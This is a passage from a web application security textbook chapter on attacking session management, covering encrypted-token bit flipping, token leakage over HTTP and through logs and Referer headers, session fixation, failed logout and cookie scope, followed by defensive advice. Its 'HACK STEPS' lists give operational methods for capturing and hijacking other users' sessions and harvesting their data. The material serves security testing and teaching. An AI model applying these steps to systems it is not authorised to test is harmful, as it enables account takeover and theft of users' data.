an administrative user with higher privileges. If you are restricted to blindly 
manipulating parts of an encrypted token, this may require a degree of luck. 
However, in some cases the application may give you more assistance. When 
an application employs symmetric encryption to protect data from tampering 
by users, it is common for the same encryption algorithm and key to be used 
throughout the application. In this situation, if any application function discloses 
to the user the decrypted value of an arbitrary encrypted string, this can be 
leveraged to fully decrypt any item of protected information.
One application observed by the authors contained a fi le upload/download 
function. Having uploaded a fi le, users were given a download link containing 
a fi lename parameter. To prevent various attacks that manipulate fi le paths, the 
application encrypted the fi lename within this parameter. However, if a user 
requested a fi le that had been deleted, the application displayed an error message showing the decrypted name of the requested fi le. This behavior could be 
leveraged to fi nd the plaintext value of any encrypted string used within the 
application, including the values of session tokens. The session tokens were 
found to contain various meaningful values in a structured format that was 
vulnerable to the type of attack described in this section. Because these values 
included textual usernames and application roles, rather than numeric identifi ers, it would have been extremely diffi cult to perform a successful exploit using 
only blind bit fl ipping. However, using the fi lename decryptor function, it was 
possible to systematically manipulate bits of a token while viewing the results. 
c07.indd 231 c07.indd 231 8/19/2011 12:07:42 PM 8/19/2011 12:07:42 PM
Stuttard c07.indd V3 - 07/22/2011 Page 232
232 Chapter 7 n Attacking Session Management
This allowed the construction of a token that, when decrypted, specifi ed a valid 
user and administrative role, enabling full control of the application.
NOTE Other techniques may allow you to decrypt encrypted data used by 
the application. A ‚Äúreveal‚Äù encryption oracle can be abused to obtain the 
cleartext value of an encrypted token. Although this can be a signifi cant 
vulnerability when decrypting a password, decrypting a session token does 
not provide an immediate means of compromising other users‚Äô sessions. 
Nevertheless, the decrypted token provides useful insight into the cleartext 
structure, which is useful in conducting a targeted bit-fl ipping attack. See 
Chapter 11 for more details about ‚Äúreveal‚Äù encryption oracle attacks.
Side channel attacks against padding oracles may be used to compromise 
encrypted tokens. See Chapter 18 for more details.
HACK STEPS
In many situations where encrypted tokens are used, actual exploitability may 
depend on various factors, including the offsets of block boundaries relative 
to the data you need to attack, and the application‚Äôs tolerance of the changes 
that you cause to the surrounding plaintext structure. Working completely 
blind, it may appear diffi cult to construct an effective attack, however in many 
situations this is in fact possible.
 1. Unless the session token is obviously meaningful or sequential in itself, 
always consider the possibility that it might be encrypted. You can often 
identify that a block-based cipher is being used by registering several different usernames and adding one character in length each time. If you 
find a point where adding one character results in your session token 
jumping in length by 8 or 16 bytes, then a block cipher is probably being 
used. You can confirm this by continuing to add bytes to your username, 
and looking for the same jump occurring 8 or 16 bytes later.
 2. ECB cipher manipulation vulnerabilities are normally difficult to identify 
and exploit in a purely black-box context. You can try blindly duplicating and moving the ciphertext blocks within your token, and reviewing 
whether you remain logged in to the application within your own user 
context, or that of another user, or none at all. 
 3. You can test for CBC cipher manipulation vulnerabilities by running a Burp 
Intruder attack over the whole token, using the ‚Äúbit flipping‚Äù payload 
source. If the bit flipping attack identifies a section within the token, the 
manipulation of which causes you to remain in a valid session, but as a 
different or nonexistent user, perform a more focused attack on just this 
section, trying a wider range of values at each position.
c07.indd 232 c07.indd 232 8/19/2011 12:07:42 PM 8/19/2011 12:07:42 PM
Stuttard c07.indd V3 - 07/22/2011 Page 233
 Chapter 7 n Attacking Session Management 233
 4. During both attacks, monitor the application‚Äôs responses to identify the 
user associated with your session following each request, and try to 
exploit any opportunities for privilege escalation that may result.
 5. If your attacks are unsuccessful, but it appears from step 1 that variablelength input that you control is being incorporated into the token, you 
should try generating a series of tokens by adding one character at a time, 
at least up to the size of blocks being used. For each resulting token, you 
should reperform steps 2 and 3. This will increase the chance that the 
data you need to modify is suitably aligned with block boundaries for 
your attack to succeed.
Weaknesses in Session Token Handling
No matter how effective an application is at ensuring that the session tokens it 
generates do not contain any meaningful information and are not susceptible 
to analysis or prediction, its session mechanism will be wide open to attack if 
those tokens are not handled carefully after generation. For example, if tokens 
are disclosed to an attacker via some means, the attacker can hijack user sessions even if predicting the tokens is impossible.
An application‚Äôs unsafe handling of tokens can make it vulnerable to attack 
in several ways.
COMMON MYTH
‚ÄúOur token is secure from disclosure to third parties because we use SSL.‚Äù
Proper use of SSL certainly helps protect session tokens from being captured. But various mistakes can still result in tokens being transmitted in 
cleartext even when SSL is in place. And various direct attacks against end 
users can be used to obtain their tokens.
COMMON MYTH
‚ÄúOur token is generated by the platform using mature, cryptographically 
sound technologies, so it is not vulnerable to compromise.‚Äù
An application server‚Äôs default behavior is often to create a session cookie 
when the user fi rst visits the site and to keep this available for the user‚Äôs 
entire interaction with the site. As described in the following sections, this 
may lead to various security vulnerabilities in how the token is handled.
c07.indd 233 c07.indd 233 8/19/2011 12:07:42 PM 8/19/2011 12:07:42 PM
Stuttard c07.indd V3 - 07/22/2011 Page 234
234 Chapter 7 n Attacking Session Management
Disclosure of Tokens on the Network
This area of vulnerability arises when the session token is transmitted across 
the network in unencrypted form, enabling a suitably positioned eavesdropper 
to obtain the token and therefore masquerade as the legitimate user. Suitable 
positions for eavesdropping include the user‚Äôs local network, within the user‚Äôs IT 
department, within the user‚Äôs ISP, on the Internet backbone, within the application‚Äôs 
ISP, and within the IT department of the organization hosting the application. In 
each case, this includes both authorized personnel of the relevant organization 
and any external attackers who have compromised the infrastructure concerned.
In the simplest case, where an application uses an unencrypted HTTP connection for communications, an attacker can capture all data transmitted between 
client and server, including login credentials, personal information, payment 
details, and so on. In this situation, an attack against the user‚Äôs session is often 
unnecessary because the attacker can already view privileged information 
and can log in using captured credentials to perform other malicious actions. 
However, there may still be instances where the user‚Äôs session is the primary 
target. For example, if the captured credentials are insuffi cient to perform a 
second login (for example, in a banking application, they may include a number 
displayed on a changing physical token, or specifi c digits from the user‚Äôs PIN), 
the attacker may need to hijack the eavesdropped session to perform arbitrary 
actions. Or if logins are audited closely, and the user is notifi ed of each successful login, an attacker may want to avoid performing his own login to be as 
stealthy as possible.
In other cases, an application may use HTTPS to protect key client-server 
communications yet may still be vulnerable to interception of session tokens 
on the network. This weakness may occur in various ways, many of which can 
arise specifi cally when HTTP cookies are used as the transmission mechanism 
for session tokens:
n Some applications elect to use HTTPS to protect the user‚Äôs credentials 
during login but then revert to HTTP for the remainder of the user‚Äôs session. Many web mail applications behave in this way. In this situation, an 
eavesdropper cannot intercept the user‚Äôs credentials but may still capture 
the session token. The Firesheep tool, released as a plug-in for Firefox, 
makes this an easy process.
n Some applications use HTTP for preauthenticated areas of the site, such 
as the site‚Äôs front page, but switch to HTTPS from the login page onward. 
However, in many cases the user is issued a session token at the fi rst page 
visited, and this token is not modifi ed when the user logs in. The user‚Äôs 
session, which is originally unauthenticated, is upgraded to an authenticated session after login. In this situation an eavesdropper can intercept a 
user‚Äôs token before login, wait for the user‚Äôs communications to switch to 
c07.indd 234 c07.indd 234 8/19/2011 12:07:42 PM 8/19/2011 12:07:42 PM
Stuttard c07.indd V3 - 07/22/2011 Page 235
 Chapter 7 n Attacking Session Management 235
HTTPS, indicating that the user is logging in, and then attempt to access 
a protected page (such as My Account) using that token.
n Even if the application issues a fresh token following successful login, 
and uses HTTPS from the login page onward, the token for the user‚Äôs 
authenticated session may still be disclosed. This can happen if the user 
revisits a preauthentication page (such as Help or About), either by following links within the authenticated area, by using the back button, or 
by typing the URL directly.
n In a variation on the preceding case, the application may attempt to switch 
to HTTPS when the user clicks the Login link. However, it may still accept 
a login over HTTP if the user modifi es the URL accordingly. In this situation, a suitably positioned attacker can modify the pages returned in the 
preauthenticated areas of the site so that the Login link points to an HTTP 
page. Even if the application issues a fresh session token after successful login, the attacker may still intercept this token if he has successfully 
downgraded the user‚Äôs connection to HTTP.
n Some applications use HTTP for all static content within the application, 
such as images, scripts, style sheets, and page templates. This behavior 
is often indicated by a warning within the user‚Äôs browser, as shown in 
Figure 7-9. When a browser shows this warning, it has already retrieved 
the relevant item over HTTP, so the session token has already been transmitted. The purpose of the browser‚Äôs warning is to let the user decline 
to process response data that has been received over HTTP and so may 
be tainted. As described previously, an attacker can intercept the user‚Äôs 
session token when the user‚Äôs browser accesses a resource over HTTP and 
use this token to access protected, nonstatic areas of the site over HTTPS.
Figure 7-9: Browsers present a warning when a 
page accessed over HTTPS contains items accessed 
over HTTP.
n Even if an application uses HTTPS for every page, including unauthenticated areas of the site and static content, there may still be circumstances 
in which users‚Äô tokens are transmitted over HTTP. If an attacker can 
somehow induce a user to make a request over HTTP (either to the HTTP 
c07.indd 235 c07.indd 235 8/19/2011 12:07:42 PM 8/19/2011 12:07:42 PM
Stuttard c07.indd V3 - 07/22/2011 Page 236
236 Chapter 7 n Attacking Session Management
service on the same server if one is running or to http://server:443/
otherwise), his token may be submitted. Means by which the attacker 
may attempt this include sending the user a URL in an e-mail or instant 
message, placing autoloading links into a website the attacker controls, 
or using clickable banner ads. (See Chapters 12 and 13 for more details 
about techniques of this kind for delivering attacks against other users.)
HACK STEPS
 1. Walk through the application in the normal way from first access (the 
‚Äústart‚Äù URL), through the login process, and then through all of the application‚Äôs functionality. Keep a record of every URL visited, and note every 
instance in which a new session token is received. Pay particular attention to login functions and transitions between HTTP and HTTPS communications. This can be achieved manually using a network sniffer such 
as Wireshark or partially automated using the logging functions of your 
intercepting proxy, as shown in Figure 7-10.
Figure 7-10: Walking through an application to identify locations where new 
session tokens are received.
 2. If HTTP cookies are being used as the transmission mechanism for session 
tokens, verify whether the secure flag is set, preventing them from ever 
being transmitted over unencrypted connections.
 3. Determine whether, in the normal use of the application, session tokens 
are ever transmitted over an unencrypted connection. If so, they should be 
regarded as vulnerable to interception.
 4. Where the start page uses HTTP, and the application switches to HTTPS 
for the login and authenticated areas of the site, verify whether a new 
token is issued following login, or whether a token transmitted during the 
HTTP stage is still being used to track the user‚Äôs authenticated session. 
Also verify whether the application will accept login over HTTP if the login 
URL is modified accordingly.
c07.indd 236 c07.indd 236 8/19/2011 12:07:43 PM 8/19/2011 12:07:43 PM
Stuttard c07.indd V3 - 07/22/2011 Page 237
 Chapter 7 n Attacking Session Management 237
 5. Even if the application uses HTTPS for every page, verify whether the 
server is also listening on port 80, running any service or content. If so, 
visit any HTTP URL directly from within an authenticated session, and 
verify whether the session token is transmitted.
 6. In cases where a token for an authenticated session is transmitted to the 
server over HTTP, verify whether that token continues to be valid or is 
immediately terminated by the server.
TRY IT!
http://mdsec.net/auth/369/
http://mdsec.net/auth/372/
http://mdsec.net/auth/374/
Disclosure of Tokens in Logs
Aside from the clear-text transmission of session tokens in network communications, the most common place where tokens are simply disclosed to unauthorized 
view is in system logs of various kinds. Although it is a rarer occurrence, the 
consequences of this kind of disclosure are usually more serious. Those logs 
may be viewed by a far wider range of potential attackers, not just by someone 
who is suitably positioned to eavesdrop on the network.
Many applications provide functionality for administrators and other support personnel to monitor and control aspects of the application‚Äôs runtime state, 
including user sessions. For example, a helpdesk worker assisting a user who is 
having problems may ask for her username, locate her current session through 
a list or search function, and view relevant details about the session. Or an 
administrator may consult a log of recent sessions in the course of investigating a security breach. Often, this kind of monitoring and control functionality 
discloses the actual session token associated with each session. And often, the 
functionality is poorly protected, allowing unauthorized users to access the list 
of current session tokens, and thereby hijack the sessions of all application users.
The other main cause of session tokens appearing in system logs is where an 
application uses the URL query string as a mechanism for transmitting tokens, 
as opposed to using HTTP cookies or the body of POST requests. For example, 
Googling inurl:jsessionid identifi es thousands of applications that transmit 
the Java platform session token (called jsessionid) within the URL:
http://www.webjunction.org/do/Navigation;jsessionid=
F27ED2A6AAE4C6DA409A3044E79B8B48?category=327
c07.indd 237 c07.indd 237 8/19/2011 12:07:43 PM 8/19/2011 12:07:43 PM
Stuttard c07.indd V3 - 07/22/2011 Page 238
238 Chapter 7 n Attacking Session Management
When applications transmit their session tokens in this way, it is likely that 
their session tokens will appear in various system logs to which unauthorized 
parties may have access:
n Users‚Äô browser logs
n Web server logs
n Logs of corporate or ISP proxy servers
n Logs of any reverse proxies employed within the application‚Äôs hosting 
environment
n The Referer logs of any servers that application users visit by following 
off-site links, as shown in Figure 7-11
Some of these vulnerabilities arise even if HTTPS is used throughout the 
application.
Figure 7-11: When session tokens appear in URLs, these are transmitted in the 
Referer header when users follow an off-site link or their browser loads an offsite resource.
The fi nal case just described presents an attacker with a highly effective 
means of capturing session tokens in some applications. For example, if a 
web mail application transmits session tokens within the URL, an attacker 
can send e-mails to users of the application containing a link to a web server 
he controls. If any user accesses the link (because she clicks it, or because 
her browser loads images contained within HTML-formatted e-mail), the 
attacker receives, in real time, the user‚Äôs session token. The attacker can run 
a simple script on his server to hijack the session of every token received and 
c07.indd 238 c07.indd 238 8/19/2011 12:07:43 PM 8/19/2011 12:07:43 PM
Stuttard c07.indd V3 - 07/22/2011 Page 239
 Chapter 7 n Attacking Session Management 239
perform some malicious action, such as send spam e-mail, harvest personal 
information, or change passwords.
NOTE Current versions of Internet Explorer do not include a Referer header 
when following off-site links contained in a page that was accessed over 
HTTPS. In this situation, Firefox includes the Referer header provided that the 
off-site link is also being accessed over HTTPS, even if it belongs to a different domain. Hence, sensitive data placed in URLs is vulnerable to leakage in 
Referer logs even where SSL is being used.
HACK STEPS
 1. Identify all the functionality within the application, and locate any logging or monitoring functions where session tokens can be viewed. Verify 
who can access this functionality‚Äìfor example, administrators, any 
authenticated user, or any anonymous user. See Chapter 4 for techniques 
for discovering hidden content that is not directly linked from the main 
application.
 2. Identify any instances within the application where session tokens are 
transmitted within the URL. It may be that tokens are generally transmitted in a more secure manner but that developers have used the URL in 
specific cases to work around particular difficulties. For example, this 
behavior is often observed where a web application interfaces with an 
external system.
 3. If session tokens are being transmitted in URLs, attempt to find any application functionality that enables you to inject arbitrary off-site links into 
pages viewed by other users. Examples include functionality implementing a message board, site feedback, question-and-answer, and so on. If 
so, submit links to a web server you control and wait to see whether any 
users‚Äô session tokens are received in your Referer logs.
 4. If any session tokens are captured, attempt to hijack user sessions by 
using the application as normal but substituting a captured token for your 
own. You can do this by intercepting the next response from the server 
and adding a Set-Cookie header of your own with the captured cookie 
value. In Burp, you can apply a single Suite-wide configuration that sets 
a specific cookie in all requests to the target application to allow easy 
switching between different session contexts during testing.
 6. If a large number of tokens are captured, and session hijacking allows you 
to access sensitive data such as personal details, payment information, 
or user passwords, you can use the automated techniques described in 
Chapter 14 to harvest all desired data belonging to other application users.
c07.indd 239 c07.indd 239 8/19/2011 12:07:43 PM 8/19/2011 12:07:43 PM
Stuttard c07.indd V3 - 07/22/2011 Page 240
240 Chapter 7 n Attacking Session Management
TRY IT!
http://mdsec.net/auth/379/
Vulnerable Mapping of Tokens to Sessions
Various common vulnerabilities in session management mechanisms arise 
because of weaknesses in how the application maps the creation and processing 
of session tokens to individual users‚Äô sessions themselves.
The simplest weakness is to allow multiple valid tokens to be concurrently 
assigned to the same user account. In virtually every application, there is no 
legitimate reason why any user should have more than one session active at 
one time. Of course, it is fairly common for a user to abandon an active session 
and start a new one ‚Äî for example, because he closes a browser window or 
moves to a different computer. But if a user appears to be using two different 
sessions simultaneously, this usually indicates that a security compromise has 
occurred: either the user has disclosed his credentials to another party, or an 
attacker has obtained his credentials through some other means. In both cases, 
permitting concurrent sessions is undesirable, because it allows users to persist 
in undesirable practices without inconvenience and because it allows an attacker 
to use captured credentials without risk of detection.
A related but distinct weakness is for applications to use ‚Äústatic‚Äù tokens. 
These look like session tokens and may initially appear to function like them, 
but in fact they are no such thing. In these applications, each user is assigned 
a token, and this same token is reissued to the user every time he logs in. The 
application always accepts the token as valid regardless of whether the user 
has recently logged in and been issued with it. Applications like this really 
involve a misunderstanding about the whole concept of what a session is, and 
the benefi ts it provides for managing and controlling access to the application. 
Sometimes, applications operate like this as a means of implementing poorly 
designed ‚Äúremember me‚Äù functionality, and the static token is accordingly 
stored in a persistent cookie (see Chapter 6). Sometimes the tokens themselves 
are vulnerable to prediction attacks, making the vulnerability far more serious. 
Rather than compromising the sessions of currently logged-in users, a successful 
attack compromises, for all time, the accounts of all registered users.
Other kinds of strange application behavior are also occasionally observed 
that demonstrate a fundamental defect in the relationship between tokens and 
sessions. One example is where a meaningful token is constructed based on a 
username and a random component. For example, consider the token:
dXNlcj1kYWY7cjE9MTMwOTQxODEyMTM0NTkwMTI=
which Base64-decodes to:
user=daf;r1=13094181213459012
c07.indd 240 c07.indd 240 8/19/2011 12:07:43 PM 8/19/2011 12:07:43 PM
Stuttard c07.indd V3 - 07/22/2011 Page 241
 Chapter 7 n Attacking Session Management 241
After extensive analysis of the r1 component, we may conclude that this cannot 
be predicted based on a sample of values. However, if the application‚Äôs session 
processing logic is awry, it may be that an attacker simply needs to submit any
valid value as r1 and any valid value as user to access a session under the security 
context of the specifi ed user. This is essentially an access control vulnerability, 
because decisions about access are being made on the basis of user-supplied 
data outside of the session (see Chapter 8). It arises because the application 
effectively uses session tokens to signify that the requester has established some
kind of valid session with the application. However, the user context in which 
that session is processed is not an integral property of the session itself but is 
determined per-request through some other means. In this case, that means 
can be directly controlled by the requester.
HACK STEPS
 1. Log in to the application twice using the same user account, either from 
different browser processes or from different computers. Determine 
whether both sessions remain active concurrently. If so, the application 
supports concurrent sessions, enabling an attacker who has compromised 
another user‚Äôs credentials to make use of these without risk of detection.
 2. Log in and log out several times using the same user account, either 
from different browser processes or from different computers. Determine 
whether a new session token is issued each time or whether the same 
token is issued each time you log in. If the latter occurs, the application is 
not really employing proper sessions.
 3. If tokens appear to contain any structure and meaning, attempt to separate out components that may identify the user from those that appear to 
be inscrutable. Try to modify any user-related components of the token so 
that they refer to other known users of the application, and verify whether 
the resulting token is accepted by the application and enables you to 
masquerade as that user.
TRY IT!
http://mdsec.net/auth/382/
http://mdsec.net/auth/385/
Vulnerable Session Termination
Proper termination of sessions is important for two reasons. First, keeping the 
life span of a session as short as is necessary reduces the window of opportunity 
within which an attacker may capture, guess, or misuse a valid session token. 
c07.indd 241 c07.indd 241 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 242
242 Chapter 7 n Attacking Session Management
Second, it provides users with a means of invalidating an existing session when 
they no longer require it. This enables them to reduce this window further and 
to take some responsibility for securing their session in a shared computing 
environment. The main weaknesses in session termination functions involve 
failures to meet these two key objectives.
Some applications do not enforce effective session expiration. Once created, a 
session may remain valid for many days after the last request is received, before 
the server eventually expires the session. If tokens are vulnerable to some kind 
of sequencing fl aw that is particularly diffi cult to exploit (for example, 100,000 
guesses for each valid token identifi ed), an attacker may still be able to capture 
the tokens of every user who has accessed the application in the recent past.
Some applications do not provide effective logout functionality:
n In some cases, a logout function is simply not implemented. Users have 
no means of causing the application to invalidate their session.
n In some cases, the logout function does not actually cause the server 
to invalidate the session. The server removes the token from the user‚Äôs 
browser (for example, by issuing a Set-Cookie instruction to blank the 
token). However, if the user continues to submit the token, the server 
still accepts it.
n In the worst cases, when a user clicks Logout, this fact is not communicated to the server, so the server performs no action. Rather, a client-side 
script is executed that blanks the user‚Äôs cookie, meaning that subsequent 
requests return the user to the login page. An attacker who gains access 
to this cookie could use the session as if the user had never logged out.
Some applications that do not use authentication still contain functionality 
that enables users to build up sensitive data within their session (for example, 
a shopping application). Yet typically they do not provide any equivalent of a 
logout function for users to terminate their session.
HACK STEPS
 1. Do not fall into the trap of examining actions that the application performs on the client-side token (such as cookie invalidation via a new 
Set-Cookie instruction, client-side script, or an expiration time attribute). 
In terms of session termination, nothing much depends on what happens 
to the token within the client browser. Rather, investigate whether session 
expiration is implemented on the server side:
 a. Log in to the application to obtain a valid session token.
 b. Wait for a period without using this token, and then submit a request 
for a protected page (such as ‚Äúmy details‚Äù) using the token.
c07.indd 242 c07.indd 242 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 243
 Chapter 7 n Attacking Session Management 243
 c. If the page is displayed as normal, the token is still active.
 d. Use trial and error to determine how long any session expiration timeout is, or whether a token can still be used days after the last request 
using it. Burp Intruder can be configured to increment the time interval between successive requests to automate this task.
 2. Determine whether a logout function exists and is prominently made 
available to users. If not, users are more vulnerable, because they have no 
way to cause the application to invalidate their session.
 3. Where a logout function is provided, test its effectiveness. After logging out, 
attempt to reuse the old token and determine whether it is still valid. If so, 
users remain vulnerable to some session hijacking attacks even after they 
have ‚Äúlogged out.‚Äù You can use Burp Suite to test this, by selecting a recent 
session-dependent request from the proxy history and sending it to Burp 
Repeater to reissue after you have logged out from the application.
TRY IT!
http://mdsec.net/auth/423/
http://mdsec.net/auth/439/
http://mdsec.net/auth/447/
http://mdsec.net/auth/452/
http://mdsec.net/auth/457/
Client Exposure to Token Hijacking
An attacker can target other users of the application in an attempt to capture 
or misuse the victim‚Äôs session token in various ways:
n An obvious payload for cross-site scripting attacks is to query the user‚Äôs 
cookies to obtain her session token, which can then be transmitted to an 
arbitrary server controlled by the attacker. All the various permutations 
of this attack are described in detail in Chapter 12.
n Various other attacks against users can be used to hijack the user‚Äôs session 
in different ways. With session fi xation vulnerabilities, an attacker feeds 
a known session token to a user, waits for her to log in, and then hijacks 
her session. With cross-site request forgery attacks, an attacker makes 
a crafted request to an application from a web site he controls, and he 
exploits the fact that the user‚Äôs browser automatically submits her current 
cookie with this request. These attacks are also described in Chapter 12.
c07.indd 243 c07.indd 243 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 244
244 Chapter 7 n Attacking Session Management
HACK STEPS
 1. Identify any cross-site scripting vulnerabilities within the application, and 
determine whether these can be exploited to capture the session tokens 
of other users (see Chapter 12).
 2. If the application issues session tokens to unauthenticated users, obtain a 
token and perform a login. If the application does not issue a fresh token 
following a successful login, it is vulnerable to session fixation.
 3. Even if the application does not issue session tokens to unauthenticated 
users, obtain a token by logging in, and then return to the login page. If 
the application is willing to return this page even though you are already 
authenticated, submit another login as a different user using the same 
token. If the application does not issue a fresh token after the second 
login, it is vulnerable to session fixation.
 4. Identify the format of session tokens used by the application. Modify your 
token to an invented value that is validly formed, and attempt to log in. 
If the application allows you to create an authenticated session using an 
invented token, it is vulnerable to session fixation.
 5. If the application does not support login, but processes sensitive user 
information (such as personal and payment details), and allows this to be 
displayed after submission (such as on a ‚Äúverify my order‚Äù page), carry 
out the previous three tests in relation to the pages displaying sensitive 
data. If a token set during anonymous usage of the application can later 
be used to retrieve sensitive user information, the application is vulnerable to session fixation.
 6. If the application uses HTTP cookies to transmit session tokens, it may 
well be vulnerable to cross-site request forgery (XSRF). First, log in to the 
application. Then confirm that a request made to the application but originating from a page of a different application results in submission of the 
user‚Äôs token. (This submission needs to be made from a window of the 
same browser process that was used to log in to the target application.) 
Attempt to identify any sensitive application functions whose parameters 
an attacker can determine in advance, and exploit this to carry out unauthorized actions within the security context of a target user. See Chapter 
13 for more details on how to execute XSRF attacks.
Liberal Cookie Scope
The usual simple summary of how cookies work is that the server issues a cookie 
using the HTTP response header Set-cookie, and the browser then resubmits 
this cookie in subsequent requests to the same server using the Cookie header. 
In fact, matters are rather more subtle than this.
c07.indd 244 c07.indd 244 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 245
 Chapter 7 n Attacking Session Management 245
The cookie mechanism allows a server to specify both the domain and the 
URL path to which each cookie will be resubmitted. To do this, it uses the domain
and path attributes that may be included in the Set-cookie instruction.
Cookie Domain Restrictions
When the application residing at foo.wahh-app.com sets a cookie, the browser 
by default resubmits the cookie in all subsequent requests to foo.wahh-app
.com, and also to any subdomains, such as admin.foo.wahh-app.com. It does 
not submit the cookie to any other domains, including the parent domain 
wahh-app.com and any other subdomains of the parent, such as bar.wahh-app.com.
A server can override this default behavior by including a domain attribute 
in the Set-cookie instruction. For example, suppose that the application at foo
.wahh-app.com returns the following HTTP header:
Set-cookie: sessionId=19284710; domain=wahh-app.com;
The browser then resubmits this cookie to all subdomains of wahh-app.com,
including bar.wahh-app.com.
NOTE A server cannot specify just any domain using this attribute. First, the 
domain specifi ed must be either the same domain that the application is running on or a domain that is its parent (either immediately or at some remove). 
Second, the domain specifi ed cannot be a top-level domain such as .com or 
.co.uk, because this would enable a malicious server to set arbitrary cookies on any other domain. If the server violates one of these rules, the browser 
simply ignores the Set-cookie instruction.
If an application sets a cookie‚Äôs domain scope as unduly liberal, this may 
expose the application to various security vulnerabilities.
For example, consider a blogging application that allows users to register, 
log in, write blog posts, and read other people‚Äôs blogs. The main application is 
located at the domain wahh-blogs.com. When users log in to the application, 
they receive a session token in a cookie that is scoped to this domain. Each user 
can create blogs that are accessed via a new subdomain that is prefi xed by his 
username:
herman.wahh-blogs.com
solero.wahh-blogs.com
Because cookies are automatically resubmitted to every subdomain within 
their scope, when a user who is logged in browses the blogs of other users, 
his session token is submitted with his requests. If blog authors are permitted 
to place arbitrary JavaScript within their own blogs (as is usually the case in 
c07.indd 245 c07.indd 245 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 246
246 Chapter 7 n Attacking Session Management
real-world blog applications), a malicious blogger can steal the session tokens 
of other users in the same way as is done in a stored cross-site scripting attack 
(see Chapter 12).
The problem arises because user-authored blogs are created as subdomains 
of the main application that handles authentication and session management. 
There is no facility within HTTP cookies for the application to prevent cookies 
issued by the main domain from being resubmitted to its subdomains.
The solution is to use a different domain name for the main application (for 
example, www.wahh-blogs.com) and to scope the domain of its session token 
cookies to this fully qualifi ed name. The session cookie will not then be submitted when a logged-in user browses the blogs of other users.
A different version of this vulnerability arises when an application explicitly 
sets the domain scope of its cookies to a parent domain. For example, suppose that a security-critical application is located at the domain sensitiveapp
.wahh-organization.com. When it sets cookies, it explicitly liberalizes their 
domain scope, as follows:
Set-cookie: sessionId=12df098ad809a5219; domain=wahh-organization.com
The consequence of this is that the sensitive application‚Äôs session token cookies 
will be submitted when a user visits every subdomain used by wahh-organization
.com, including:
www.wahh-organization.com
testapp.wahh-organization.com
Although these other applications may all belong to the same organization as 
the sensitive application, it is undesirable for the sensitive application‚Äôs cookies 
to be submitted to other applications, for several reasons:
n The personnel responsible for the other applications may have a different 
level of trust than those responsible for the sensitive application.
n The other applications may contain functionality that enables third parties to obtain the value of cookies submitted to the application, as in the 
previous blogging example.
n The other applications may not have been subjected to the same security 
standards or testing as the sensitive application (because they are less 
important, do not handle sensitive data, or have been created only for test 
purposes). Many kinds of vulnerability that may exist in those applications (for example, cross-site scripting vulnerabilities) may be irrelevant 
to the security posture of those applications. But they could enable an 
external attacker to leverage an insecure application to capture session 
tokens created by the sensitive application.
c07.indd 246 c07.indd 246 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 247
 Chapter 7 n Attacking Session Management 247
NOTE Domain-based segregation of cookies is not as strict as the sameorigin policy in general (see Chapter 3). In addition to the issues already 
described in the handling of hostnames, browsers ignore both the protocol 
and port number when determining cookie scope. If an application shares a 
hostname with an untrusted application and relies on a difference in protocol 
or port number to segregate itself, the more relaxed handling of cookies may 
undermine this segregation. Any cookies issued by the application will be 
accessible by the untrusted application that shares its hostname.
HACK STEPS
Review all the cookies issued by the application, and check for any domain
attributes used to control the scope of the cookies.
 1. If an application explicitly liberalizes its cookies‚Äô scope to a parent 
domain, it may be leaving itself vulnerable to attacks via other web 
applications.
 2. If an application sets its cookies‚Äô domain scope to its own domain name 
(or does not specify a domain attribute), it may still be exposed to applications or functionality accessible via subdomains.
Identify all the possible domain names that will receive the cookies issued 
by the application. Establish whether any other web application or functionality is accessible via these domain names that you may be able to leverage to 
obtain the cookies issued to users of the target application.
Cookie Path Restrictions
When the application residing at /apps/secure/foo-app/index.jsp sets a 
cookie, the browser by default resubmits the cookie in all subsequent requests 
to the path /apps/secure/foo-app/ and also to any subdirectories. It does not 
submit the cookie to the parent directory or to any other directory paths that 
exist on the server.
As with domain-based restrictions on cookie scope, a server can override this 
default behavior by including a path attribute in the Set-cookie instruction. 
For example, if the application returns the following HTTP header:
Set-cookie: sessionId=187ab023e09c00a881a; path=/apps/;
the browser resubmits this cookie to all subdirectories of the /apps/ path.
In contrast to domain-based scoping of cookies, this path-based restriction is 
much stricter than what is imposed by the same-origin policy. As such, it is almost 
entirely ineffective if used as a security mechanism to defend against untrusted 
c07.indd 247 c07.indd 247 8/19/2011 12:07:44 PM 8/19/2011 12:07:44 PM
Stuttard c07.indd V3 - 07/22/2011 Page 248
248 Chapter 7 n Attacking Session Management
applications hosted on the same domain. Client-side code running at one path 
can open a window or iframe targeting a different path on the same domain and 
can read from and write to that window without any restrictions. Hence, obtaining a cookie that is scoped to a different path on the same domain is relatively 
straightforward. See the following paper by Amit Klein for more details:
http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/
2006-March/000843.html
Securing Session Management
The defensive measures that web applications must take to prevent attacks on 
their session management mechanisms correspond to the two broad categories 
of vulnerability that affect those mechanisms. To perform session management 
in a secure manner, an application must generate its tokens in a robust way and 
must protect these tokens throughout their life cycle from creation to disposal.
Generate Strong Tokens
The tokens used to reidentify a user between successive requests should be 
generated in a manner that does not provide any scope for an attacker who 
obtains a large sample of tokens from the application in the usual way to predict 
or extrapolate the tokens issued to other users.
The most effective token generation mechanisms are those that:
n Use an extremely large set of possible values
n Contain a strong source of pseudorandomness, ensuring an even and 
unpredictable spread of tokens across the range of possible values
In principle, any item of arbitrary length and complexity may be guessed 
using brute force given suffi cient time and resources. The objective of designing 
a mechanism to generate strong tokens is that it should be extremely unlikely 
that a determined attacker with large amounts of bandwidth and processing 
resources should be successful in guessing a single valid token within the life 
span of its validity.
Tokens should consist of nothing more than an identifi er used by the server 
to locate the relevant session object to be used to process the user‚Äôs request. 
The token should contain no meaning or structure, either overtly or wrapped 
in layers of encoding or obfuscation. All data about the session‚Äôs owner and 
status should be stored on the server in the session object to which the session 
token corresponds.
Be careful when selecting a source of randomness. Developers should be 
aware that the various sources available to them are likely to differ in strength 
